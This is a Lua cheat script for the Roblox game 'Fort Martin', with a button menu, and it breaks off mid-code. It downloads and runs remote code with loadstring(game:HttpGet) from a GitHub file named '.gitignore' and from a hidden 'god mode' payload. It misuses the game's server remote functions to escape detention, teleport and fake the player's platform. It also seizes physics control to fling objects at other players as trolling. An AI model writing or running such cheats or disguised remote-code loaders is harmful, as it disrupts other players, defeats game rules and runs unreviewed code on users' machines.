local script12321 = "Athelios"
local game12321 = "Game: Fort Martin"

local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovemariobro/Testing/main/.gitignore"))()
    local GUI = Mercury:Create{
        Name = "Home",
        Size = UDim2.fromOffset(600, 400),
        Theme = Mercury.Themes.Dark,
        Link = "https://github.com/Soiletha/Athelios"
    }
    
    local Tab = GUI:Tab{
    	Name = "Miscellaneous",
    	Icon = "rbxassetid://6157200594"
    }
    
    Tab:Button{
    	Name = "MPC undetain TP",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Reseting and tping...",
    	Duration = 8,
    	Callback = function() end
    }
    local args = {
        [1] = 1
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Respawn:InvokeServer()
    
    wait(0.1)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
    
    
    wait(0.2)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-215.136826, 10.2285948, 1628.71802, 0.475295752, -5.86179716e-10, -0.879826069, -8.12481638e-10, 1, -1.10516019e-09, 0.879826069, 1.24012045e-09, 0.475295752)
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(5)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(50)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(68)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    
    end}
    
    Tab:Button{
    	Name = "MPC undetain/force-reset",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Reseting...",
    	Duration = 8,
    	Callback = function() end
    }
    local args = {
        [1] = 1
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.Respawn:InvokeServer()
    
    wait(0.1)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(5)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(50)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(68)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
    wait(3)
    
    end}
    
    Tab:Button{
    	Name = "God mode",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "God modded.",
    	Duration = 8,
    	Callback = function() end
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovemariobro/Testing/main/c"))(' Watermelon ?')
    end}
    Tab:Button{
    	Name = "Take damage [trolling]",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "If at full health you can click the *Take damage* 4 times without dying.",
    	Duration = 8,
    	Callback = function() end
    }
    local args = {
        [1] = 0.2
    }
    game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
    end}
    Tab:Button{
    	Name = "Unanchored Parts (For trolling)",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Reseting...",
    	Duration = 8,
    	Callback = function() end
    }
    if not _G.ini then
    _G.ini = true
    
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://216917652"
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    
    
    
    wait()
    game.StarterGui:SetCore("SendNotification", {
    Title = "Unanchored To Player"; -- the title (ofc)
    Text = "GUI Loaded - F to Hide/Show"; -- what the text says (ofc)
    Duration = 5; -- how long the notification should in secounds
    })
    
    
    local heartbeat = game:GetService("RunService").Heartbeat
    spawn(function()
        while true do heartbeat:Wait()
        for i,v in pairs(game.Players:GetPlayers()) do
            if v == game.Players.LocalPlayer == false then
                game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
                game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
                v.MaximumSimulationRadius = 0
                v.SimulationRadius = 0
                game:GetService("RunService").Stepped:wait()
        end
    end
    end
    end)
    
    local Imput = game:GetService("UserInputService")
    local Plr = game.Players.LocalPlayer
    local Mouse = Plr:GetMouse()
    
    function To(position)
    local Chr = Plr.Character
    local sound2 = Instance.new("Sound")
    sound2.SoundId = "rbxassetid://3398620867"
    sound2.Parent = game:GetService("SoundService")
    if Chr ~= nil then
    for index, part in pairs(game:GetDescendants()) do
    if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
        part.CFrame = CFrame.new(position) --TP Part To Mouse
        sound2:Play()
    
        if spam == true and part:FindFirstChild("BodyGyro") == nil then
        local bodyPos = Instance.new("BodyPosition")
        bodyPos.Position = part.Position
        bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyPos.P = 1e6
        bodyPos.Parent = part
        end
    end
    end
    end
    end
    
    
    
    
    
    Imput.InputBegan:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseButton1 and Imput:IsKeyDown(Enum.KeyCode.LeftControl) then
           To(Mouse.Hit.p)
       end
    end)
    
    
    
    
    
    
    
    -- key that opens/closes the ui
    local toggle_key = Enum.KeyCode.F
    
    -- function that executes desired code
    execute = function(name)
    
    
    
        for index, part in pairs(game:GetDescendants()) do
        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
        part.CFrame = CFrame.new(game.workspace[name].Head.Position) --TP Part To User
        end
        end
    
    
    
    end
    
    local uis = game:GetService("UserInputService")
    local ts = game:GetService("TweenService")
    
    -- ui functions
    fade = function(obj, len, props)
    	ts:Create(obj, TweenInfo.new(len, Enum.EasingStyle.Sine), props):Play()
    end
    
    -- shorthand variables
    local u2, c3 = UDim2.new, Color3.fromRGB
    local u2f, c3w = u2(1, 0, 1, 0), c3(255, 255, 255)
    
    -- ui init
    local g = Instance.new("ScreenGui", game.CoreGui)
    local f = Instance.new("Frame", g)
    local t = Instance.new("TextLabel", f)
    local c = Instance.new("ScrollingFrame", f)
    
    -- core ui styling
    local padding = Instance.new("UIPadding", f)
    local maxsize = Instance.new("UISizeConstraint", f)
    local textsize = Instance.new("UITextSizeConstraint", t)
    local listcons = Instance.new("UIListLayout", c)
    
    padding.PaddingBottom = UDim.new(0, 8)
    padding.PaddingLeft = UDim.new(0, 15)
    padding.PaddingRight = UDim.new(0, 15)
    padding.PaddingTop = UDim.new(0, 0)
    
    maxsize.MaxSize = Vector2.new(275, 450)
    maxsize.MinSize = Vector2.new(200, 0)
    textsize.MaxTextSize = 16
    listcons.Padding = UDim.new(0, 3)
    
    -- ui instance properties
    g.Name = "unanchor_ui"
    g.ResetOnSpawn = false
    f.Name = "main"
    t.Name = "header"
    
    f.Size = u2(0.165, 0, 0.6, 0)
    f.BorderSizePixel = 0
    f.BackgroundTransparency = 0.3
    f.Position = u2(1, -215, 0.5, -150)
    f.BackgroundColor3 = c3()
    f.AnchorPoint = Vector2.new(1, 0.5)
    f.Position = u2(1, -15, 0.5, 0)
    
    t.Size = u2(1, 0, 0.1, 0)
    t.BackgroundTransparency = 1
    t.TextColor3 = c3w
    t.Font = Enum.Font.GothamBold
    t.TextScaled = true
    t.TextXAlignment = Enum.TextXAlignment.Center
    t.Text = "UNANCHORED TO PLAYER BY TomQ#6764"
    
    c.Name = "playerlist"
    c.Position = u2(0, 0, 0.1, 0)
    c.Size = u2(1, 0, 0.45, 0)
    c.BackgroundTransparency = 1
    c.BorderSizePixel = 0
    c.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
    c.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
    c.ScrollingDirection = Enum.ScrollingDirection.Y
    c.ScrollBarThickness = 5
    c.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
    
    -- playerlist entry ui template
    local temp = Instance.new("Frame", f)
    temp.Name = "temp"
    temp.Visible = false
    temp.Size = u2(1, -5, 0, 27)
    temp.BackgroundTransparency = 0.5
    temp.BorderSizePixel = 0
    temp.ClipsDescendants = true
    temp.BackgroundColor3 = c3()
    
    local tpad = Instance.new("UIPadding", temp)
    tpad.PaddingLeft = UDim.new(0, 5)
    tpad.PaddingRight = UDim.new(0, 5)
    
    local tb = Instance.new("TextButton", temp)
    tb.Name = "button"
    tb.BackgroundTransparency = 1
    tb.ZIndex = 5
    tb.BorderSizePixel = 0
    tb.Text = ""
    tb.Size = u2(1, 10, 1, 0)
    tb.Position = u2(0, -5, 0, 0)
    
    local tcl = Instance.new("TextLabel", temp)
    tcl.Name = "username"
    tcl.BackgroundTransparency = 1
    tcl.BorderSizePixel = 0
    tcl.Size = u2f
    tcl.TextColor3 = c3w
    tcl.TextXAlignment = Enum.TextXAlignment.Left
    tcl.TextScaled = true
    tcl.Size = u2(0.6, 0, 1, 0)
    tcl.Font = Enum.Font.Gotham
    
    local tcls = Instance.new("UITextSizeConstraint", tcl)
    tcls.MaxTextSize = 14
    
    local thumb = Instance.new("ImageLabel", temp)
    thumb.Name = "thumb"
    thumb.Size = u2(0.35, 0, 0.35, 0)
    thumb.SizeConstraint = Enum.SizeConstraint.RelativeXX
    thumb.Position = u2(1, 0, 0, -15)
    thumb.AnchorPoint = Vector2.new(1, 0)
    thumb.BackgroundTransparency = 1
    thumb.BorderSizePixel = 0
    
    -- settings ui
    local sh = Instance.new("TextLabel", f)
    sh.Name = "settings_header"
    sh.Size = u2(1, 0, 0.1, 0)
    sh.Position = u2(0, 0, 0.55, 0)
    sh.BackgroundTransparency = 1
    sh.BorderSizePixel = 0
    sh.ZIndex = 3
    sh.TextColor3 = c3w
    sh.Font = Enum.Font.GothamBold
    sh.TextScaled = true
    sh.TextXAlignment = Enum.TextXAlignment.Center
    sh.Text = "SETTINGS"
    
    local shs = Instance.new("UITextSizeConstraint", sh)
    shs.MaxTextSize = 16
    
    local items = Instance.new("ScrollingFrame", f)
    items.Name = "items"
    items.Size = u2(1, 0, 0.35, 0)
    items.Position = u2(0, 0, 0.65, 0)
    items.BackgroundTransparency = 1
    items.BorderSizePixel = 0
    items.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
    items.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
    items.ScrollingDirection = Enum.ScrollingDirection.Y
    items.ScrollBarThickness = 5
    items.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
    
    local itemll = Instance.new("UIListLayout", items)
    itemll.Padding = UDim.new(0, 3)
    
    createSetting = function(name)
    	local setting = Instance.new("Frame", items)
    	setting.Size = u2(1, -5, 0, 27)
    	setting.BackgroundColor3 = c3()
    	setting.BackgroundTransparency = 0.5
    	setting.BorderSizePixel = 0
    	
    	local spad = tpad:Clone()
    	spad.Parent = setting
    	
    	local slab = tcl:Clone()
    	slab.Name = "label"
    	slab.Parent = setting
    	slab.Size = u2(1, 0, 1, 0)
    	slab.Text = name
    	
    	local stbt = tb:Clone()
    	stbt.Parent = setting
    	
    	stbt.MouseEnter:connect(function()
    		fade(setting, 0.25, {BackgroundTransparency = 0.8})
    	end)
    	
    	stbt.MouseLeave:connect(function()
    		fade(setting, 0.25, {BackgroundTransparency = 0.5})
    	end)
    	
    	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
    	
    	return stbt
    end
    
    
    -- settings & functionality
    
    
    
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://179235828"
        sound.Parent = game:GetService("SoundService")
    
    
    spam = false
    local spamblocks = createSetting("Spam Parts")
    spamblocks.MouseButton1Down:connect(function()
    spam = not spam
       if spam then
           fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
           sound:Play()
           -- code to loop here
       else
           fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3w})
           sound:Play()
           -- code to break the loop here
       end
    end)
    
    
    
    createSetting("Break Spam").MouseButton1Down:connect(function()
        for index, part in pairs(game:GetDescendants()) do
        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
        sound:Play()
        if part:FindFirstChild("BodyForce") then
        part.BodyForce:Destroy()
        end
    
        if part:FindFirstChild("BodyGyro") then
        part.BodyGyro:Destroy()
        end
    
        if part:FindFirstChild("BodyPosition") then
        part.BodyPosition:Destroy()
        end
    
        if part:FindFirstChild("BodyThrust") then
        part.BodyThrust:Destroy()
        end
    end
    end
    end)
    
    freeze = false
    local freezeblocks = createSetting("Freeze Parts")
    freezeblocks.MouseButton1Down:connect(function()
    freeze = not freeze
        if freeze then
            fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
            sound:Play()
            print "UTP: Freezed Parts"
            for _,part in pairs(workspace:GetChildren()) do
            if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
                local bodyPos = Instance.new("BodyPosition")
                bodyPos.Position = part.Position
                bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyPos.P = 1e6
                bodyPos.Parent = part
            end
            end
        else
            fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3w})
            sound:Play()
            print "UTP: Thawed Parts"
            for _,part in pairs(workspace:GetChildren()) do
            if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
                if part:FindFirstChild("BodyPosition") then
                part.BodyPosition:Destroy()
                end
            end
           -- code to break the loop here
    end
    end
    end)
    
    createSetting("Remove Accessories Mesh").MouseButton1Down:connect(function()
        sound:Play()
    
        local plr = game:GetService("Players").LocalPlayer
        local char = plr.Character
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") and v.Handle:FindFirstChild("SpecialMesh") then
        ag = v.Handle:FindFirstChild("SpecialMesh")
        ag:Destroy()
        end
        end
    
    
        local plr = game:GetService("Players").LocalPlayer
        local char = plr.Character
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") and v.Handle:FindFirstChild("Mesh") then
        ag = v.Handle:FindFirstChild("Mesh")
        ag:Destroy()
        end
        end
    end)
    
    createSetting("Drop Accessories").MouseButton1Down:connect(function()
        sound:Play()
    	for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    		if v:IsA("Accessory") then
                v.Handle.Parent = workspace
    			v.Parent = workspace
    		end
    	end
    end)
    
    createSetting("Reset").MouseButton1Down:connect(function()
        sound:Play()
    	game.Players.LocalPlayer.Character:BreakJoints()
    end)
    
    
    highlight = false
    local highlights = createSetting("Highlight Unanchored")
    highlights.MouseButton1Down:connect(function()
    highlight = not highlight
        if highlight then
            fade(highlights.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
            sound:Play()
            print "UTP: Unanchored Highlighted"
            for _,part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
                local selectionBox = Instance.new("SelectionBox")
                selectionBox.Adornee = part
                selectionBox.Color3 = Color3.new(1,0,0)
                selectionBox.Parent = part
            end
            end
        else
            fade(highlights.Parent.label, 0.25, {TextColor3 = c3w})
            sound:Play()
            print "UTP: Unanchored Un-Highlighted"
            for _,part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
                if part:FindFirstChild("SelectionBox") then
                part.SelectionBox:Destroy()
                end
            end
    end
    end
    end)
    
    createSetting("Check Other Players").MouseButton1Down:connect(function()
        sound:Play()
        g = 0
        spawn(function()
            for i,v in pairs(game.Players:GetPlayers()) do
                if v.SimulationRadius > 5555 then
                    g = g + 1
                    print(v.Name, "is using Unanchored To Player")
                    game:GetService("RunService").Stepped:wait()
                    
            end
        end
        print ("Checked all players, found", g ,"using Unanchored To Player")
        end)
    end)
    
    createSetting("Count Unanchored Parts").MouseButton1Down:connect(function()
        sound:Play()
        b = 0
        for index, part in pairs(game.workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
            b = b + 1
        end
        end
        print ("All parts checked, found", b ,"that are unanchored")
    end)
    
    
    
    
    
    
    
    
    createEntry = function(name, id)
    	local entry = temp:Clone()
    	entry.Parent = c
    	entry.username.Text = name
    	entry.thumb.Image = game:GetService("Players"):GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    	entry.Visible = true
    	entry.LayoutOrder = #c:GetChildren()
    	entry.Name = name
    
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://3398620867"
        sound.Parent = game:GetService("SoundService")
    	-- handle clicking for player
    	entry.button.MouseButton1Down:connect(function()
    		execute(name)
            sound:Play()
    	end)
    	
    	entry.button.MouseEnter:connect(function()
    		fade(entry, 0.25, {BackgroundTransparency = 0.8})
    	end)
    	
    	entry.button.MouseLeave:connect(function()
    		fade(entry, 0.25, {BackgroundTransparency = 0.5})
    	end)
    end
    
    deleteEntry = function(name)
    	for _,v in pairs(c:GetChildren()) do
    		if v.Name == name then
    			v:Destroy()
    		end
    	end
    end
    
    -- create entry for client
    createEntry(game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId)
    
    -- create entries for all other players
    for _,v in pairs(game.Players:GetPlayers()) do
    	if v ~= game.Players.LocalPlayer then
    		createEntry(v.Name, v.UserId)
    	end
    end
    
    listcons:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
    	c.CanvasSize = u2(0, 0, 0, listcons.AbsoluteContentSize.Y)
    end)
    
    itemll:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
    	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
    end)
    
    uis.InputBegan:connect(function(input, gpe)
    	if not gpe then
    		if input.KeyCode == toggle_key then
    			g.Enabled = not g.Enabled
    		end
    	end
    end)
    
    -- dragging code, ripped from https://devforum.roblox.com/t/draggable-property-is-hidden-on-gui-objects/107689/5
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
    	local delta = input.Position - dragStart
    	f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    f.InputBegan:Connect(function(input)
    	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
    		dragging = true
    		dragStart = input.Position
    		startPos = f.Position
    		
    		input.Changed:Connect(function()
    			if input.UserInputState == Enum.UserInputState.End then
    				dragging = false
    			end
    		end)
    	end
    end)
    
    f.InputChanged:Connect(function(input)
    	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
    		dragInput = input
    	end
    end)
    
    uis.InputChanged:Connect(function(input)
    	if input == dragInput and dragging then
    		update(input)
    	end
    end)
    
    game.Players.PlayerAdded:connect(function(plr)
    	createEntry(plr.Name, plr.UserId)
    end)
    
    game.Players.PlayerRemoving:connect(function(plr)
    	deleteEntry(plr.Name)
    end)
    else
    print "================ALREADY LOADED================"
    
    
    
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://2130284653"
        sound.Parent = game:GetService("SoundService")
    sound:Play()
    
    game.StarterGui:SetCore("SendNotification", {
    Title = "Already Loaded"; -- the title (ofc)
    Text = "GUI Already Loaded"; -- what the text says (ofc)
    Duration = 5; -- how long the notification should in secounds
    })
    end
    end}
    
    
    Tab:Button{
    	Name = "Icon Mobile",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "You are now Mobile.",
    	Duration = 8,
    	Callback = function() end
    }
    
    local args = {
        [1] = "Mobile"
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
    
    end}
    
    Tab:Button{
    	Name = "Icon Desktop/PC",
    	Description = nil,
    	Callback = function() 
    	    local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "You are now Desktop/PC.",
    	Duration = 8,
    	Callback = function() end
    }
    
    local args = {
        [1] = "PC"
    }
    
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))
    
    end}
    
    local Tab = GUI:Tab{
    	Name = "TP places",
    	Icon = "rbxassetid://7199724739"
    }
    
    Tab:Button{
    	Name = "ASOC pavs/helipads/parachutes",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-273.986847, 9.68434334, 1178.64819, 0.00443687011, 9.06104791e-09, 0.999990165, 3.58640362e-09, 1, -9.07704933e-09, -0.999990165, 3.62664188e-09, 0.00443687011)
    end}
    
    Tab:Button{
    	Name = "MPC HQ",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.9417114, 9.73274612, 600.078186, -0.00775325531, -5.18449683e-09, 0.999969959, 2.86729041e-08, 1, 5.40696776e-09, -0.999969959, 2.87139628e-08, -0.00775325531)
    end}
    
    Tab:Button{
    	Name = "MPC Jail",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.9367905, -5.68009472, 582.540588, -0.999667168, -4.01923606e-10, -0.0257991701, -9.49855472e-11, 1, -1.18984325e-08, 0.0257991701, -1.18920216e-08, -0.999667168)
    end}
    
    Tab:Button{
    	Name = "MPC helipads",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88.2854691, 44.2849922, 544.887329, -0.999979973, 8.76001138e-08, 0.0063287681, 8.75278161e-08, 1, -1.17001431e-08, -0.0063287681, -1.1145965e-08, -0.999979973)
    end}
    
    Tab:Button{
    	Name = "Main Pavs",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(183.76088, 9.68735409, 1341.93616, 0.999822497, -2.0820492e-08, -0.0188397747, 2.1129976e-08, 1, 1.62280891e-08, 0.0188397747, -1.6623293e-08, 0.999822497)
    end}
    
    Tab:Button{
    	Name = "BCT spawn",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(956.411621, 10.3406439, 873.142639, -0.0111339716, 5.66165177e-08, 0.999938011, 6.61164705e-08, 1, -5.58838416e-08, -0.999938011, 6.54901626e-08, -0.0111339716)
    end}
    
    Tab:Button{
    	Name = "BCT middle",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1064.91479, 10.3148546, 690.214233, -0.999999821, -7.53033369e-09, -0.000608675531, -7.56502061e-09, 1, 5.69855487e-08, 0.000608675531, 5.69901424e-08, -0.999999821)
    end}
    
    Tab:Button{
    	Name = "BCT gates",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
    	Callback = function() end 
                    
                }
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1088.23694, 9.55546761, 955.511597, 0.0375596099, -2.03822603e-09, 0.9992944, -8.33467517e-09, 1, 2.3529334e-09, -0.9992944, -8.41716918e-09, 0.0375596099)
    end}
    
    Tab:Button{
    	Name = "BCT back entrence",
    	Description = nil,
    	Callback = function() local CoreGui = game:GetService("StarterGui")
    
                GUI:Notification{
    	Title = "Alert",
    	Text = "Teleporting...",
    	Duration = 2,
                }
